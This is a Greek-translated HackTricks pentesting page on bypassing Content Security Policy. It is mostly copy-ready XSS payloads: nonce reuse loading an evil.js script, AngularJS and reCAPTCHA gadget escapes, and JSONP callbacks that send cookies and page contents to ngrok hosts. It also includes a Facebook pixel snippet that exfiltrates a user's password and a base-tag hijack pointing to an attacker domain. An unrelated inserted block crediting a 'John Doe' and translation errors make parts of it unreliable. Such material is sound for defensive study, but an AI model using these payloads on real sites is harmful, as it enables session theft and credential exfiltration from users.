# Παράκαμψη Πολιτικής Ασφάλειας Περιεχομένου (CSP)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**Διακομιστή Discord του HackenProof**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξετάζει την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορο κόσμο του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες εκκινήσεις ευρημάτων ευρημάτων και τις κρίσιμες ενημερώσεις πλατφόρμας

**Ελάτε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε να συνεργάζεστε με κορυφαίους χάκερ σήμερα! 

## Τι είναι η CSP

Η Πολιτική Ασφάλειας Περιεχομένου (CSP) αναγνωρίζεται ως τεχνολογία περιήγησης, με κύριο στόχο την **προστασία ενάντια σε επιθέσεις όπως η διασπορά σελίδων (XSS)**. Λειτουργεί καθορίζοντας και λεπτομερώς ποιες διαδρομές και πηγές μπορούν να φορτωθούν με ασφάλεια από τον περιηγητή. Αυτοί οι πόροι περιλαμβάνουν μια σειρά στοιχείων όπως εικόνες, πλαίσια και JavaScript. Για παράδειγμα, μια πολιτική μπορεί να επιτρέπει τη φόρτωση και εκτέλεση πόρων από τον ίδιο τομέα (self), συμπεριλαμβανομένων των ενσωματωμένων πόρων και την εκτέλεση κώδικα συμβολοσειράς μέσω λειτουργιών όπως `eval`, `setTimeout`, ή `setInterval`.

Η εφαρμογή της CSP πραγματοποιείται μέσω **κεφαλίδων απάντησης** ή με την ενσωμάτωση **στοιχείων meta στη σελίδα HTML**. Με βάση αυτήν την πολιτική, οι περιηγητές επιβάλλουν αυτές τις προδιαγραφές και αμέσως αποκλείουν οποιεσδήποτε ανιχνευθείσες παραβάσεις.
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* Υλοποιημένο μέσω ετικέτας meta:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Επικεφαλίδες

Το CSP μπορεί να επιβληθεί ή να παρακολουθείται χρησιμοποιώντας αυτές τις επικεφαλίδες:

* `Content-Security-Policy`: Επιβάλλει το CSP· ο περιηγητής αποκλείει οποιεσδήποτε παραβάσεις.
* `Content-Security-Policy-Report-Only`: Χρησιμοποιείται για παρακολούθηση· αναφέρει παραβάσεις χωρίς να τις αποκλείει. Ιδανικό για δοκιμές σε περιβάλλοντα προεγγενέστερης παραγωγής.

### Ορισμός Πόρων

Το CSP περιορίζει τις πηγές για τη φόρτωση ενεργών και παθητικών περιεχομένων, ελέγχοντας πτυχές όπως η εκτέλεση inline JavaScript και η χρήση του `eval()`. Ένα παράδειγμα πολιτικής είναι:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Οδηγίες

* **script-src**: Επιτρέπει συγκεκριμένες πηγές για JavaScript, συμπεριλαμβανομένων διευθύνσεων URL, ενσωματωμένων scripts, και scripts που ενεργοποιούνται από event handlers ή XSLT stylesheets.
* **default-src**: Ορίζει μια προεπιλεγμένη πολιτική για τη λήψη πόρων όταν συγκεκριμένες οδηγίες λήψης λείπουν.
* **child-src**: Καθορίζει τις επιτρεπόμενες πηγές για web workers και περιεχόμενα ενσωματωμένων πλαισίων.
* **connect-src**: Περιορίζει τις διευθύνσεις URL που μπορούν να φορτωθούν χρησιμοποιώντας διεπαφές όπως fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Περιορίζει τις διευθύνσεις URL για πλαίσια.
* **frame-ancestors**: Καθορίζει ποιες πηγές μπορούν να ενσωματώσουν την τρέχουσα σελίδα, εφαρμόσιμο σε στοιχεία όπως `<frame>`, `<iframe>`, `<object>`, `<embed>`, και `<applet>`.
* **img-src**: Ορίζει τις επιτρεπόμενες πηγές για εικόνες.
* **font-src**: Καθορίζει τις έγκυρες πηγές για γραμματοσειρές που φορτώνονται χρησιμοποιώντας `@font-face`.
* **manifest-src**: Ορίζει τις επιτρεπόμενες πηγές αρχείων μεταφοράς εφαρμογής.
* **media-src**: Ορίζει τις επιτρεπόμενες πηγές για τη φόρτωση αντικειμένων πολυμέσων.
* **object-src**: Ορίζει τις επιτρεπόμενες πηγές για τα στοιχεία `<object>`, `<embed>`, και `<applet>`.
* **base-uri**: Καθορίζει τις επιτρεπόμενες διευθύνσεις URL για φόρτωση χρησιμοποιώντας στοιχεία `<base>`.
* **form-action**: Καταχωρίζει έγκυρα σημεία έκδοσης για υποβολές φορμών.
* **plugin-types**: Περιορίζει τους τύπους mime που μια σελίδα μπορεί να ενεργοποιήσει.
* **upgrade-insecure-requests**: Οδηγεί τους browsers να μεταγράψουν τις διευθύνσεις URL HTTP σε HTTPS.
* **sandbox**: Εφαρμόζει περιορισμούς παρόμοιους με το χαρακτηριστικό sandbox ενός `<iframe>`.
* **report-to**: Καθορίζει μια ομάδα στην οποία θα σταλεί έκθεση εάν η πολιτική παραβιαστεί.
* **worker-src**: Καθορίζει τις έγκυρες πηγές για scripts Worker, SharedWorker, ή ServiceWorker.
* **prefetch-src**: Καθορίζει τις έγκυρες πηγές για πόρους που θα φορτωθούν ή θα προφορτωθούν.
* **navigate-to**: Περιορίζει τις διευθύνσεις URL στις οποίες μπορεί να πλοηγηθεί ένα έγγραφο με οποιονδήποτε τρόπο (σύνδεσμος, φόρμα, window.location, window.open, κλπ.)

### Πηγές

* `*`: Επιτρέπει όλες τις διευθύνσεις URL εκτός από αυτές με τις σχήματα `data:`, `blob:`, `filesystem:`.
* `'self'`: Επιτρέπει τη φόρτωση από τον ίδιο τομέα.
* `'data'`: Επιτρέπει τη φόρτωση πόρων μέσω του σχήματος data (π.χ., εικόνες κωδικοποιημένες σε Base64).
* `'none'`: Αποκλείει τη φόρτωση από οποιαδήποτε πηγή.
* `'unsafe-eval'`: Επιτρέπει τη χρήση της `eval()` και παρόμοιων μεθόδων, δεν συνιστάται για λόγους ασφαλείας.
* `'unsafe-hashes'`: Ενεργοποιεί συγκεκριμένους inline event handlers.
* `'unsafe-inline'`: Επιτρέπει τη χρήση inline πόρων όπως inline `<script>` ή `<style>`, δεν συνιστάται για λόγους ασφαλείας.
* `'nonce'`: Μια λευκή λίστα για συγκεκριμένα inline scripts χρησιμοποιώντας έναν κρυπτογραφικό nonce (αριθμός που χρησιμοποιείται μία φορά).
* Εάν έχετε περιορισμένη εκτέλεση JS, είναι δυνατόν να λάβετε ένα χρησιμοποιημένο nonce μέσα στη σελίδα με `doc.defaultView.top.document.querySelector("[nonce]")` και στη συνέχεια να το επαναχρησιμοποιήσετε για τη φόρτωση ενός κακόβουλου script (εάν χρησιμοποιείται το strict-dynamic, οποιαδήποτε επιτρεπόμενη πηγή μπορεί να φορτώσει νέες πηγές οπότε αυτό δεν είναι απαραίτητο), όπως στο:

<details>

<summary>Φόρτωση script επαναχρησιμοποιώντας nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: Λευκολιστεί σενάρια με συγκεκριμένο κατακερματισμό sha256.
* `'strict-dynamic'`: Επιτρέπει τη φόρτωση σεναρίων από οποιαδήποτε πηγή εάν έχει προστεθεί στη λευκή λίστα με ένα nonce ή κατακερματισμό.
* `'host'`: Καθορίζει μια συγκεκριμένη φιλοξενία, όπως `example.com`.
* `https:`: Περιορίζει τις διευθύνσεις URL σε αυτές που χρησιμοποιούν HTTPS.
* `blob:`: Επιτρέπει τη φόρτωση πόρων από διευθύνσεις URL Blob (π.χ. διευθύνσεις URL Blob που δημιουργούνται μέσω JavaScript).
* `filesystem:`: Επιτρέπει τη φόρτωση πόρων από το σύστημα αρχείων.
* `'report-sample'`: Περιλαμβάνει ένα δείγμα του καταπατούμενου κώδικα στην αναφορά παραβίασης (χρήσιμο για αποσφαλμάτωση).
* `'strict-origin'`: Παρόμοιο με το 'self' αλλά εξασφαλίζει ότι το επίπεδο ασφάλειας πρωτοκόλλου των πηγών ταιριάζει με το έγγραφο (μόνο ασφαλείς πηγές μπορούν να φορτώσουν πόρους από ασφαλείς πηγές).
* `'strict-origin-when-cross-origin'`: Αποστέλλει πλήρεις διευθύνσεις URL κατά την πραγματοποίηση αιτήσεων με την ίδια προέλευση, αλλά αποστέλλει μόνο την προέλευση όταν η αίτηση είναι διασυνοριακή.
* `'unsafe-allow-redirects'`: Επιτρέπει τη φόρτωση πόρων που θα ανακατευθύνουν αμέσως σε άλλο πόρο. Δεν συνιστάται καθώς αποδυναμώνει την ασφάλεια.

## Μη ασφαλείς Κανόνες CSP

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Λειτουργικό φορτίο: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' μέσω Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
Αυτό δεν λειτουργεί, για περισσότερες πληροφορίες [**ελέγξτε αυτό**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Λειτουργικό φορτίο:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Αν μπορείτε με κάποιον τρόπο να κάνετε έναν **επιτρεπόμενο κώδικα JS να δημιουργήσει ένα νέο ετικέτα script** στο DOM με τον κώδικά σας, επειδή ένας επιτρεπόμενος κώδικας δημιουργεί τον, η **νέα ετικέτα script θα επιτραπεί να εκτελεστεί**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Λειτουργικό φορτίο:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Έλλειψη object-src και default-src

{% hint style="danger" %}
**Φαίνεται ότι αυτό πλέον δεν λειτουργεί**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Λειτουργικά φορτία:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Μεταφόρτωση Αρχείου + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Αν μπορείτε να μεταφορτώσετε ένα αρχείο JS μπορείτε να παρακάμψετε αυτό το CSP:

Λειτουργικό φορτίο:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Ωστόσο, είναι υψηλά πιθανό ότι ο διακομιστής επικυρώνει το ανεβασμένο αρχείο και θα σας επιτρέψει μόνο να ανεβάσετε συγκεκριμένο τύπο αρχείων.

Επιπλέον, ακόμα κι αν μπορούσατε να ανεβάσετε έναν κώδικα JS μέσα σε ένα αρχείο χρησιμοποιώντας μια επέκταση που αποδέχεται ο διακομιστής (όπως: _script.png_), αυτό δεν θα είναι αρκετό επειδή μερικοί διακομιστές όπως ο διακομιστής apache επιλέγουν τον τύπο MIME του αρχείου με βάση την επέκταση και οι περιηγητές όπως ο Chrome θα αρνηθούν να εκτελέσουν κώδικα Javascript μέσα σε κάτι που θα έπρεπε να είναι μια εικόνα. "Ευτυχώς", υπάρχουν λάθη. Για παράδειγμα, από ένα CTF μάθαινα ότι ο **Apache δεν γνωρίζει** την επέκταση _**.wave**_, επομένως δεν την εξυπηρετεί με έναν τύπο MIME όπως audio/\*.

Από εδώ, αν βρείτε ένα XSS και ένα ανέβασμα αρχείου και καταφέρετε να βρείτε μια **εσφαλμένη επέκταση**, μπορείτε να δοκιμάσετε να ανεβάσετε ένα αρχείο με αυτήν την επέκταση και το περιεχόμενο του script. Ή, αν ο διακομιστής ελέγχει τη σωστή μορφή του ανεβασμένου αρχείου, δημιουργήστε ένα πολύγλωττο ([κάποια παραδείγματα πολύγλωττων εδώ](https://github.com/Polydet/polyglot-database)).

### Ενέργεια φόρμας

Αν δεν είναι δυνατή η ενσωμάτωση JS, μπορείτε ακόμα να δοκιμάσετε να εξαγάγετε, για παράδειγμα, διαπιστευτήρια **ενσωματώνοντας μια ενέργεια φόρμας** (και ίσως να περιμένετε οι διαχειριστές κωδικών πρόσβασης να συμπληρώνουν αυτόματα τους κωδικούς πρόσβασης). Μπορείτε να βρείτε ένα [**παράδειγμα σε αυτήν την αναφορά**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Επίσης, παρατηρήστε ότι το `default-src` δεν καλύπτει τις ενέργειες φόρμας.

### Τρίτες Συνδέσεις Σημείων + ('unsafe-eval')

{% hint style="warning" %}
Για μερικά από τα ακόλουθα φορτία **δεν απαιτείται καν το `unsafe-eval`**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Φορτώστε μια ευάλωτη έκδοση του Angular και εκτελέστε αυθαίρετο JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads χρησιμοποιώντας το Angular + μια βιβλιοθήκη με συναρτήσεις που επιστρέφουν το αντικείμενο `window` ([έλεγξε αυτή την ανάρτηση](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Η ανάρτηση δείχνει ότι μπορείτε **να φορτώσετε** όλες τις **βιβλιοθήκες** από `cdn.cloudflare.com` (ή οποιονδήποτε άλλο επιτρεπόμενο αποθετήριο JS βιβλιοθηκών), να εκτελέσετε όλες τις προστεθείσες συναρτήσεις από κάθε βιβλιοθήκη, και να ελέγξετε **ποιες συναρτήσεις από ποιες βιβλιοθήκες επιστρέφουν το αντικείμενο `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
### Επίθεση XSS στο Angular από το όνομα μιας κλάσης:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Κατάχρηση του κώδικα JS του Google reCAPTCHA

Σύμφωνα με [**αυτό το CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) μπορείτε να καταχραστείτε το [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) μέσα σε ένα CSP για να εκτελέσετε αυθαίρετο κώδικα JS παρακάμπτοντας το CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Περισσότερα [**φορτία από αυτήν την ανάλυση**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### Κατάχρηση του www.google.com για ανοικτή ανακατεύθυνση

Το παρακάτω URL ανακατευθύνει στο example.com (από [εδώ](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
### Κατάχρηση \*.google.com/script.google.com

Είναι δυνατή η κατάχρηση του Google Apps Script για τη λήψη πληροφοριών σε μια σελίδα μέσα στο script.google.com. Όπως έχει [γίνει σε αυτήν την αναφορά](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Τρίτες Συνδέσεις + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Σενάρια όπως αυτό όπου το `script-src` έχει οριστεί σε `self` και ένα συγκεκριμένο τομέα που έχει προστεθεί στη λευκή λίστα μπορούν να παρακαμφθούν χρησιμοποιώντας το JSONP. Τα σημεία JSONP επιτρέπουν μη ασφαλείς μεθόδους κλήσης που επιτρέπουν σε έναν επιτιθέμενο να εκτελέσει XSS, λειτουργικό φορτίο:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **περιέχει έτοιμα σημεία JSONP για την παράκαμψη του CSP σε διάφορες ιστοσελίδες.**

Η ίδια ευπάθεια θα εμφανιστεί αν το **αξιόπιστο σημείο περιέχει μια Ανοικτή Ανακατεύθυνση** επειδή αν το αρχικό σημείο είναι αξιόπιστο, οι ανακατευθύνσεις είναι αξιόπιστες.

### Κατάχρηση από τρίτους

Όπως περιγράφεται στην [ακόλουθη ανάρτηση](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), υπάρχουν πολλοί τομείς τρίτων, που ενδέχεται να επιτρέπονται κάπου στο CSP, μπορούν να καταχραστούν είτε για την εξαγωγή δεδομένων είτε για την εκτέλεση κώδικα JavaScript. Μερικοί από αυτούς τους τρίτους είναι:

| Οντότητα         | Επιτρεπόμενος Τομέας                         | Δυνατότητες  |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Εξαγωγή     |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Εξαγωγή     |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Εκτέλεση    |
| Amazon CloudFront | \*.cloudfront.net                            | Εξαγωγή, Εκτέλεση  |
| Amazon AWS        | \*.amazonaws.com                             | Εξαγωγή, Εκτέλεση  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Εξαγωγή, Εκτέλεση  |
| Salesforce Heroku | \*.herokuapp.com                             | Εξαγωγή, Εκτέλεση  |
| Google Firebase   | \*.firebaseapp.com                           | Εξαγωγή, Εκτέλεση  |

Αν βρείτε κάποιον από τους επιτρεπόμενους τομείς στο CSP του στόχου σας, υπάρχει πιθανότητα να μπορέσετε να παρακάμψετε το CSP καταχωρίζοντας στην υπηρεσία τρίτου και, είτε να εξάγετε δεδομένα σε αυτήν την υπηρεσία είτε να εκτελέσετε κώδικα.

Για παράδειγμα, αν βρείτε το ακόλουθο CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
```markdown
## CSP Bypass

### Περίληψη

Η πολιτική ασφαλείας περιεχομένου (Content Security Policy - CSP) είναι ένα μηχανισμός ασφαλείας που χρησιμοποιείται για τη μείωση ή την εξάλειψη επιθέσεων όπως η XSS. Ωστόσο, υπάρχουν τεχνικές που μπορούν να χρησιμοποιηθούν για την παράκαμψη της CSP και την εκτέλεση κώδικα που δεν επιτρέπεται από την πολιτική αυτή.

### Περιγραφή

Σε αυτό τον φάκελο περιέχονται παραδείγματα και τεχνικές για την παράκαμψη της CSP. Οι επιθέσεις που εκμεταλλεύονται ευπάθειες στην υλοποίηση της CSP μπορούν να οδηγήσουν σε επιτυχημένη εκτέλεση κώδικα από κακόβουλες πηγές.

### Συγγραφέας

Αυτό το υλικό δημιουργήθηκε από τον έμπειρο χάκερ John Doe, εξειδικευμένο στις επιθέσεις ενάντια στην CSP.

```
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
1. Δεν πρέπει να μπορείτε να εξαγάγετε δεδομένα, με τον ίδιο τρόπο που πάντα έχει γίνει με το [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Σε αυτήν την περίπτωση, ακολουθείτε αυτά τα γενικά βήματα:

2. Δημιουργήστε ένα λογαριασμό Ανάπτυξης Facebook εδώ.
3. Δημιουργήστε μια νέα εφαρμογή "Facebook Login" και επιλέξτε "Ιστοσελίδα".
4. Πηγαίνετε σε "Ρυθμίσεις -> Βασικές" και πάρτε το "App ID" σας.
5. Στην ιστοσελίδα-στόχο από την οποία θέλετε να εξάγετε δεδομένα, μπορείτε να εξάγετε δεδομένα χρησιμοποιώντας απευθείας το Facebook SDK gadget "fbq" μέσω ενός "customEvent" και των δεδομένων φορτίου.
6. Πηγαίνετε στο "Διαχειριστή Συμβάντων" της εφαρμογής σας και επιλέξτε την εφαρμογή που δημιουργήσατε (σημείωση: ο διαχειριστής συμβάντων μπορεί να βρεθεί σε μια διεύθυνση URL παρόμοια με αυτήν: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events).
7. Επιλέξτε την καρτέλα "Δοκιμαστικά Συμβάντα" για να δείτε τα συμβάντα που στέλνονται από την ιστοσελίδα "σας".

Στη συνέχεια, στην πλευρά του θύματος, εκτελέστε τον παρακάτω κώδικα για να αρχικοποιήσετε το Facebook tracking pixel ώστε να δείχνει στην εφαρμογή του λογαριασμού ανάπτυξης του επιτιθέμενου με το app-id του και να εκδώσετε ένα προσαρμοσμένο συμβάν όπως αυτό:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
### Bypass μέσω RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Εκτός από την προαναφερθείσα ανακατεύθυνση για την παράκαμψη των περιορισμών μονοπατιών, υπάρχει μια άλλη τεχνική που ονομάζεται Relative Path Overwrite (RPO) που μπορεί να χρησιμοποιηθεί σε κάποιους διακομιστές.

Για παράδειγμα, αν το CSP επιτρέπει το μονοπάτι `https://example.com/scripts/react/`, μπορεί να παρακαμφθεί ως εξής:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Το πρόγραμμα περιήγησης θα φορτώσει τελικά το `https://example.com/scripts/angular/angular.js`.

Αυτό λειτουργεί επειδή για τον περιηγητή, φορτώνετε ένα αρχείο με το όνομα `..%2fangular%2fangular.js` που βρίσκεται στο `https://example.com/scripts/react/`, το οποίο είναι συμμορφωμένο με το CSP.

Έτσι, θα το αποκωδικοποιήσουν, ζητώντας αποτελεσματικά `https://example.com/scripts/react/../angular/angular.js`, το οποίο είναι ισοδύναμο με `https://example.com/scripts/angular/angular.js`.

Αξιοποιώντας αυτήν την αντίφαση στην ερμηνεία του URL μεταξύ του περιηγητή και του διακομιστή, μπορούν να παρακαμφθούν οι κανόνες διαδρομής.

Η λύση είναι να μην θεωρείτε το `%2f` ως `/` στην πλευρά του διακομιστή, εξασφαλίζοντας συνεπή ερμηνεία μεταξύ του περιηγητή και του διακομιστή για να αποφευχθεί αυτό το ζήτημα.

Παράδειγμα Online: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Εκτέλεση JS μέσω Iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### λείπον **base-uri**

Αν η οδηγία **base-uri** λείπει, μπορείτε να την καταχραστείτε για να εκτελέσετε μια [**dangling markup injection**](../dangling-markup-html-scriptless-injection/).

Επιπλέον, αν η **σελίδα φορτώνει ένα script χρησιμοποιώντας μια σχετική διαδρομή** (όπως `<script src="/js/app.js">`) χρησιμοποιώντας ένα **Nonce**, μπορείτε να καταχραστείτε την **ετικέτα base** για να το κάνετε να **φορτώσει** το script από το **δικό σας διακομιστή επιτυγχάνοντας ένα XSS.**\
Αν η ευάλωτη σελίδα φορτώνεται με **httpS**, χρησιμοποιήστε ένα url httpS στην ετικέτα base.
```html
<base href="https://www.attacker.com/">
```
### Συμβάντα AngularJS

Μια συγκεκριμένη πολιτική γνωστή ως Πολιτική Ασφαλείας Περιεχομένου (Content Security Policy - CSP) μπορεί να περιορίζει τα συμβάντα JavaScript. Ωστόσο, το AngularJS εισάγει προσαρμοσμένα συμβάντα ως εναλλακτική λύση. Μέσα σε ένα συμβάν, το AngularJS παρέχει ένα μοναδικό αντικείμενο `$event`, το οποίο αναφέρεται στο πρωτότυπο αντικείμενο συμβάντος του προγράμματος περιήγησης. Αυτό το αντικείμενο `$event` μπορεί να εκμεταλλευτείται για να παρακάμψει το CSP. Ιδιαίτερα, στο Chrome, το αντικείμενο `$event/event` διαθέτει ένα χαρακτηριστικό `path`, το οποίο κρατά έναν πίνακα αντικειμένων που σχετίζονται με την αλυσίδα εκτέλεσης του συμβάντος, με το αντικείμενο `window` να βρίσκεται ανέκαθεν στο τέλος. Αυτή η δομή είναι κρίσιμη για τακτικές διαφυγής από τον αμμόλοφο.

